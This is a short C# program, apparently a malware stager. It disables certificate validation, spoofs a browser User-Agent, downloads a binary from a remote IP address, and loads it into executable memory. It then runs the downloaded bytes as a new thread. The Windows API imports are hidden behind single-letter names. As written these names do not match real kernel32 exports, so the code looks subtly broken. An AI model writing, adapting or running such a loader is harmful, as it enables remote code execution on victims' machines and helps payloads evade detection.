using System;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;

class Program
{
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr a(IntPtr b, uint c, uint d, uint e);

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr f(IntPtr g, uint h, IntPtr i, IntPtr j, uint k, IntPtr l);

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern uint m(IntPtr n, uint o);

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern bool p(IntPtr q, uint r, uint s);

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr t(string u);

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr v(IntPtr w, string x);

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern uint y();

    static void Main()
    {
        string z = "https://192.168.0.102/4.bin";

        ServicePointManager.ServerCertificateValidationCallback += (A, B, C, D) => true;

        using (WebClient E = new WebClient())
        {
            E.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3");
            byte[] F = E.DownloadData(z);

            IntPtr G = a(IntPtr.Zero, (uint)F.Length, 0x1000, 0x40);

            Marshal.Copy(F, 0, G, F.Length);

            IntPtr H = f(IntPtr.Zero, 0, G, IntPtr.Zero, 0, IntPtr.Zero);

            m(H, 0xFFFFFFFF);

            p(G, 0, 0x8000);
        }
    }
}
